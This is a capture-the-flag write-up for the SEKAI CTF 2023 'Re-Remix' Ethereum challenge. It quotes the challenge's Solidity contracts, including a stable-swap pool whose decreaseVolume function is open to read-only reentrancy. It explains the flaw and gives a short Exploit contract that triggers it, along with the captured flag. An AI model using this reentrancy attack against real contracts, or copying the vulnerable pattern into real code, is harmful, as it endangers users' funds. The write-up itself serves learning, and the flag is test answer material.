# Project SEKAI CTF 2023 Re-Remix Writeup

Project SEKAI CTF 2023 included three blockchain challenges: two related to Solana and one to Ethereum.
I was so busy that I did not have time to tackle the Solana challenges, but I solved the Ethereum challenge titled "Re-Remix" and got first blood.

![](https://i.gyazo.com/f3a07389b1cc3005cdeb97784d1668d2.png)

## Writeup

The description of this challenge:
```
Hmm, it seems a bit difficult for this song to make a high-level chart uwu

How about using a remixed version instead? ✪v✪

nc chals.sekai.team 5000

Author: Y4nhu1
```

This challenge consists of the following four Solidity contracts:
- `Equalizer`
- `FreqBand`
- `MusicRemixer`
- `SampleEditor`

There was no contract named `Setup`, so I suspected it was not attached, but a quick reading of the codes reveals that the following `MusicRemixer` contract is the setup contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {ud, convert} from "@prb/math/UD60x18.sol";

import "./FreqBand.sol";
import "./SampleEditor.sol";
import "./Equalizer.sol";

contract MusicRemixer {
    uint256 private constant INITIAL_VOLUME = 100 ether;
    address private constant SIGNER = 0x886A1C4798d270902E490b488C4431F8870bCDE3;

    SampleEditor public sampleEditor;
    Equalizer public equalizer;

    mapping(bytes => bool) public usedRedemptionCode;

    event FlagCaptured();

    error TooEasy(uint256 level);
    error CodeRedeemed();
    error InvalidCode();

    constructor() payable {
        sampleEditor = new SampleEditor();

        address[3] memory bands;
        bands[0] = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE); // XDddddDdddDdDdd
        bands[1] = address(new FreqBand("Instrument", "INST"));
        bands[2] = address(new FreqBand("Vocal", "VOCAL"));

        FreqBand(bands[1]).mint(address(this), INITIAL_VOLUME);
        FreqBand(bands[2]).mint(address(this), INITIAL_VOLUME);

        equalizer = new Equalizer(bands);

        uint256[3] memory amounts = [INITIAL_VOLUME, INITIAL_VOLUME, INITIAL_VOLUME];
        IERC20(bands[1]).approve(address(equalizer), amounts[1]);
        IERC20(bands[2]).approve(address(equalizer), amounts[2]);
        equalizer.increaseVolume{value: 100 ether}(amounts);

        uint8 v = 28;
        bytes32 r = hex"1337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE1337";
        bytes32 s = hex"1337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE1337";
        usedRedemptionCode[abi.encodePacked(r, s, v)] = true;
    }

    function getMaterial(bytes memory redemptionCode) external {
        if (usedRedemptionCode[redemptionCode]) {
            revert CodeRedeemed();
        }
        bytes32 hash = ECDSA.toEthSignedMessageHash(abi.encodePacked("Music Remixer Pro Material"));
        if (ECDSA.recover(hash, redemptionCode) != SIGNER) {
            revert InvalidCode();
        }

        usedRedemptionCode[redemptionCode] = true;

        FreqBand(equalizer.bands(1)).mint(msg.sender, 1 ether);
        FreqBand(equalizer.bands(2)).mint(msg.sender, 1 ether);
    }

    function _getComplexity(uint256 n) internal pure returns (uint256 c) {
        bytes memory s = bytes(Strings.toString(n));
        bool[] memory v = new bool[](10);
        for (uint256 i; i < s.length; ++i) {
            v[uint8(s[i]) - 48] = true;
        }
        for (uint256 i; i < 10; ++i) {
            if (v[i]) ++c;
        }
    }

    function getSongLevel() public view returns (uint256) {
        return convert(ud(sampleEditor.region_tempo() * 1e18).log2()) * _getComplexity(equalizer.getGlobalInfo()); // log2(tempo) * complexity
    }

    function finish() external {
        uint256 level = getSongLevel();
        if (level < 30) {
            revert TooEasy(level);
        }
        emit FlagCaptured();
    }
}
```

Reading this contract, we can see that the goal of this challenge is to call the `finish` function successfully.
As we can see below, sending a successful transaction with the `finish` function will clear this challenge:

```
$ nc chals.sekai.team 5000
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
uuid please: 519178ba-d049-491e-bd9e-1ff96a0dd9e5
tx hash that emitted FlagCaptured event please: 
```

What can we do to successfully call the `finish` function?
To do so, the result of the `getSongLevel` function must be greater than 30, and the `FlagCaptured` event must be emitted.

The `getSongLevel` function is calculated as follows:

```solidity
function getSongLevel() public view returns (uint256) {
    return convert(ud(sampleEditor.region_tempo() * 1e18).log2()) * _getComplexity(equalizer.getGlobalInfo());  // log2(tempo) * complexity
}
```

This function uses [PaulRBerg/prb-math](https://github.com/PaulRBerg/prb-math), a solidity library for fixed-point math.
The `convert` function converts type `UD60x18` to type `uint256`, and `ud` converts type `uint256` to type `UD60x18`.

We want the result of the `getSongLevel` function to be greater than 30.
An examination of the initial value reveals that it is 10.
As noted in the comment `// log2(tempo) * complexity`, we want to increase either or both values.
- `log2(tempo)` (the initial value: `5.9...`)
- `complexity` (the initial value: `2`)

Let's first explore how to increase `log2(tempo)`.

The tempo is the result of `sampleEditor.region_tempo()`.
The `SampleEditor` contract is the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

contract SampleEditor {
    enum Align {
        None,
        Bars,
        BarsAndBeats
    }

    struct Settings {
        Align align;
        bool flexOn;
    }

    struct Region {
        Settings settings;
        bytes data;
    }

    uint256 public project_tempo = 60;
    uint256 public region_tempo = 60;

    mapping(string => Region[]) public tracks;

    error OvO(); // I'm watching you
    error QaQ();

    constructor() {
        Settings memory ff = Settings({align: Align.None, flexOn: false});
        Region[] storage r = tracks["Rhythmic"];
        r.push(Region({settings: ff, data: bytes("part1")}));
        r.push(Region({settings: ff, data: bytes("part2")}));
        r.push(Region({settings: ff, data: bytes("part3")}));
    }

    function setTempo(uint256 _tempo) external {
        if (_tempo > 233) revert OvO();
        project_tempo = _tempo;
    }

    function adjust() external {
        if (!tracks["Rhythmic"][2].settings.flexOn) {
            revert QaQ();
        }
        region_tempo = project_tempo;
    }

    function updateSettings(uint256 p, uint256 v) external {
        if (p <= 39) revert OvO();
        assembly {
            sstore(p, v)
        }
    }
}
```

The initial value of `region_tempo` is `60`, and it seems possible to change `region_tempo` to `233` by using `setTempo`, `adjust`, and `updateSettings`.
However, from the following results, it seems that `level` cannot be larger than `30` even if it is increased to `233`.

```
>>> math.log2(60)
5.906890595608519
>>> math.log2(233)
7.864186144654281
```

Thus, simply increasing the tempo is not sufficient.

Next, let's find out how much we can increase the `complexity`.

The `_getComplexity` function is processed as follows.

```solidity
    function _getComplexity(uint256 n) internal pure returns (uint256 c) {
        bytes memory s = bytes(Strings.toString(n));
        bool[] memory v = new bool[](10);
        for (uint256 i; i < s.length; ++i) {
            v[uint8(s[i]) - 48] = true;
        }
        for (uint256 i; i < 10; ++i) {
            if (v[i]) ++c;
        }
    }
```

This function returns how many different chars from `0` to `9` are used for the given number `n`.
For example, `2` is returned if `n=10` and `10` if `n=1234567890`.

Currently, the function returns `2`, and if we could increase this more than `5`, the `level` would be `5.9... * 6 = 35.4...`, and the flag is captured.
The `n` is `equalizer.getGlobalInfo()`, and its initial value is `1000000000000000000`.

The `Equalizer` contract is the following code.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

library LibMath {
    function abs(uint256 x, uint256 y) internal pure returns (uint256) {
        return x >= y ? x - y : y - x;
    }
}

// ref: https://solidity-by-example.org/defi/stable-swap-amm/
contract Equalizer is ReentrancyGuard {
    using SafeERC20 for IERC20;
    using Address for address payable;

    uint256 private constant N = 3;
    uint256 private constant A = 1000 * (N ** (N - 1));

    address[N] public bands; // frequency bands
    uint256[N] public gains;

    uint256 private constant DECIMALS = 18;
    uint256 public totalVolumeGain;
    mapping(address => uint256) public volumeGainOf;

    error NotConverge(string);
    error Invalid(string);

    constructor(address[N] memory _bands) {
        bands = _bands;
    }

    function _mint(address to, uint256 gain) internal {
        volumeGainOf[to] += gain;
        totalVolumeGain += gain;
    }

    function _burn(address from, uint256 gain) internal {
        volumeGainOf[from] -= gain;
        totalVolumeGain -= gain;
    }

    function _getD(uint256[N] memory xp) internal pure returns (uint256) {
        uint256 a = A * N;

        uint256 s;
        for (uint256 i; i < N; ++i) {
            s += xp[i];
        }

        uint256 d = s;
        uint256 d_prev;
        for (uint256 i; i < 255; ++i) {
            uint256 p = d;
            for (uint256 j; j < N; ++j) {
                p = (p * d) / (N * xp[j]);
            }
            d_prev = d;
            d = ((a * s + N * p) * d) / ((a - 1) * d + (N + 1) * p);

            if (LibMath.abs(d, d_prev) <= 1) {
                return d;
            }
        }
        revert NotConverge("D");
    }

    function _getY(uint256 i, uint256 j, uint256 x, uint256[N] memory xp) internal pure returns (uint256) {
        uint256 a = A * N;
        uint256 d = _getD(xp);
        uint256 s;
        uint256 c = d;

        uint256 _x;
        for (uint256 k; k < N; ++k) {
            if (k == i) {
                _x = x;
            } else if (k == j) {
                continue;
            } else {
                _x = xp[k];
            }

            s += _x;
            c = (c * d) / (N * _x);
        }
        c = (c * d) / (N * a);
        uint256 b = s + d / a;

        uint256 y_prev;
        uint256 y = d;
        for (uint256 _i; _i < 255; ++_i) {
            y_prev = y;
            y = (y * y + c) / (2 * y + b - d);
            if (LibMath.abs(y, y_prev) <= 1) {
                return y;
            }
        }
        revert NotConverge("Y");
    }

    function getGlobalInfo() external view returns (uint256) {
        uint256 d = _getD(gains);
        uint256 _totalVolumeGain = totalVolumeGain;
        if (_totalVolumeGain > 0) {
            return (d * 10 ** DECIMALS) / _totalVolumeGain;
        }
        return 0;
    }

    /**
     * @param i index of the band to boost
     * @param j index of the band to cut
     * @param dx determines the magnitude of the boost
     * @return dy determines the magnitude of the cut
     */
    function equalize(uint256 i, uint256 j, uint256 dx) external payable nonReentrant returns (uint256 dy) {
        if (i == j) {
            revert Invalid("index");
        }
        if (dx == 0) {
            revert Invalid("dx");
        }

        if (i == 0) {
            if (msg.value != dx) {
                revert Invalid("value");
            }
        } else {
            if (msg.value != 0) {
                revert Invalid("value");
            }
            IERC20(bands[i]).safeTransferFrom(msg.sender, address(this), dx);
        }

        uint256[N] memory xp = gains;
        uint256 x = xp[i] + dx;

        uint256 y0 = xp[j];
        uint256 y1 = _getY(i, j, x, xp);
        dy = y0 - y1 - 1;

        gains[i] += dx;
        gains[j] -= dy;

        if (j == 0) {
            payable(msg.sender).sendValue(dy);
        } else {
            IERC20(bands[j]).safeTransfer(msg.sender, dy);
        }
    }

    function increaseVolume(uint256[N] calldata amounts) external payable nonReentrant returns (uint256 variation) {
        uint256 _totalVolumeGain = totalVolumeGain;
        uint256 d0;
        uint256[N] memory old_xs = gains;
        if (_totalVolumeGain > 0) {
            d0 = _getD(old_xs);
        }

        uint256[N] memory new_xs;
        for (uint256 i; i < N; ++i) {
            uint256 amount = amounts[i];
            if (amount > 0) {
                if (i == 0) {
                    require(msg.value == amount);
                } else {
                    IERC20(bands[i]).safeTransferFrom(msg.sender, address(this), amount);
                }
                new_xs[i] = old_xs[i] + amount;
            } else {
                new_xs[i] = old_xs[i];
            }
        }

        uint256 d1 = _getD(new_xs);
        if (d1 <= d0) {
            revert Invalid("not increase");
        }

        // update
        for (uint256 i; i < N; ++i) {
            gains[i] += amounts[i];
        }

        if (_totalVolumeGain > 0) {
            variation = ((d1 - d0) * _totalVolumeGain) / d0;
        } else {
            variation = d1;
        }
        _mint(msg.sender, variation);
    }

    function decreaseVolume(uint256 variation) external nonReentrant returns (uint256[N] memory amounts) {
        if (variation == 0) {
            revert Invalid("variation");
        }
        uint256 _totalVolumeGain = totalVolumeGain;

        for (uint256 i; i < N; ++i) {
            uint256 amount = (variation * gains[i]) / _totalVolumeGain;
            gains[i] -= amount;
            amounts[i] = amount;

            if (i == 0) {
                payable(msg.sender).sendValue(amount);
            } else {
                IERC20(bands[i]).safeTransfer(msg.sender, amount);
            }
        }

        _burn(msg.sender, variation);
    }
}

```

Although there are many processes, the following `getGlobalInfo` function is important:

```solidity
    function getGlobalInfo() external view returns (uint256) {
        uint256 d = _getD(gains);
        uint256 _totalVolumeGain = totalVolumeGain;
        if (_totalVolumeGain > 0) {
            return (d * 10 ** DECIMALS) / _totalVolumeGain;
        }
        return 0;
    }
```

The initial value of `_getD(gains)` is `3e20`, and `totalVolumeGain` is also `3e20`.
It seems that a small change in either could increase the `complexity` value.

The `gains` and `totalVolumeGain` are changed by the `increaseVolume` and `decreaseVolume` functions.
However, if we call the `increaseVolume` and `decreaseVolume` functions as a trial, we will see that `_get(gains) == totalVolumeGain` is always true in the usual way.
In other words, we have to break this equivalence.

Let's start reading this `Equalizer` contract carefully.

We can find that the `decreaseVolume` function does not follow the Checks-Effects-Interactions pattern.

```solidity
    function decreaseVolume(uint256 variation) external nonReentrant returns (uint256[N] memory amounts) {
        if (variation == 0) {
            revert Invalid("variation");
        }
        uint256 _totalVolumeGain = totalVolumeGain;

        for (uint256 i; i < N; ++i) {
            uint256 amount = (variation * gains[i]) / _totalVolumeGain;
            gains[i] -= amount;
            amounts[i] = amount;

            if (i == 0) {
                payable(msg.sender).sendValue(amount);
            } else {
                IERC20(bands[i]).safeTransfer(msg.sender, amount);
            }
        }

        _burn(msg.sender, variation);
    }
```

It has a typical Read-Only Reentrancy vulnerability that we often see in [Curve Finance](https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/) and others.
When `i == 0`, an Ether transfer can be received by the fallback function of the attack contract.
At that time, the attack contract can call the `finish` function to cause an inconsistency between `gains` and `totalVolumeGain`.

Therefore, the following `Exploit` contract will get the flag.
The `msg.value` can be any proper value, e.g., 0.5 ether.

```solidity
contract Exploit {
    MusicRemixer musicRemixer;

    function exploit(address musicRemixerAddr) public payable {
        musicRemixer = MusicRemixer(musicRemixerAddr);
        musicRemixer.equalizer().increaseVolume{value: msg.value}([uint256(msg.value), 0, 0]);
        uint256 volume = musicRemixer.equalizer().volumeGainOf(address(this));
        musicRemixer.equalizer().decreaseVolume(volume);
    }

    receive() external payable {
        musicRemixer.finish();
    }
}
```

Flag: `SEKAI{T0o_H4rd_4_M3_2_p1aY_uwu_13ack_7o_Exp3rt_l3v3l}`

After all, there is no need to change the `tempo`.
